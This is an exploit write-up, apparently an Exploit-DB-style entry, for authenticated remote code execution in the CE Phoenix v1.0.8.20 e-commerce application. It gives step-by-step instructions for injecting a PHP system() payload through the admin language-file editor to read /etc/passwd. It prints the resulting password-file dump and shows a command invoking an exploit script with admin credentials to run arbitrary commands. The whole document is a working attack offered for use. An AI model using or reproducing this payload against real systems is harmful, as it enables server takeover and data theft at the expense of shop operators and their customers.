## Exploit Title: CE Phoenix v1.0.8.20 - Remote Code Execution (RCE) (Authenticated)
#### Date: 2023-11-25
#### Exploit Author: tmrswrr
#### Category: Webapps
#### Vendor Homepage: [CE Phoenix](https://phoenixcart.org/)
#### Version: v1.0.8.20
#### Tested on: [Softaculous Demo - CE Phoenix](https://www.softaculous.com/apps/ecommerce/CE_Phoenix)

### POC:

<img src="https://raw.githubusercontent.com/capture0x/Phoenix/main/1.png" alt="Magento Image" width="1000">
<img src="https://raw.githubusercontent.com/capture0x/Phoenix/main/2.png" alt="Magento Image" width="1000">


1. **Login to admin panel:** 
    - Visit: `https://demos6.softaculous.com/CE_Phoenixvkqhcarjmw/admin/define_language.php?lngdir=english`
    
2. **Access english.php:**
    - Click on `english.php` and inject the payload: 
    ```
    <?php echo system('cat /etc/passwd'); ?>
    ```
    
3. **Save Changes:**
    - Save the modified file.

4. **View Results:**
    - Visit the main page: `https://demos6.softaculous.com/CE_Phoenixvkqhcarjmw/`
    - You will see the following result:


root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
systemd-bus-proxy:x:999:998:systemd Bus Proxy:/:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
polkitd:x:998:997:User for polkitd:/:/sbin/nologin
tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
chrony:x:997:995::/var/lib/chrony:/sbin/nologin
soft:x:1000:1000::/home/soft:/sbin/nologin
saslauth:x:996:76:Saslauthd user:/run/saslauthd:/sbin/nologin
mailnull:x:47:47::/var/spool/mqueue:/sbin/nologin
smmsp:x:51:51::/var/spool/mqueue:/sbin/nologin
emps:x:995:1001::/home/emps:/bin/bash
named:x:25:25:Named:/var/named:/sbin/nologin
exim:x:93:93::/var/spool/exim:/sbin/nologin
vmail:x:5000:5000::/var/local/vmail:/bin/bash
mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/false
webuzo:x:993:993::/home/webuzo:/bin/bash
apache:x:992:991::/home/apache:/sbin/nologin
apache:x:992:991::/home/apache:/sbin/nologin

## Exploit :

```
python3 phoenix.py https://demos6.softaculous.com/CE_Phoenixb619pdusey admin pass "whoami && id"
```
<img src="https://raw.githubusercontent.com/capture0x/Phoenix/main/phoenix.png" alt="Phoenix Image" width="1000">

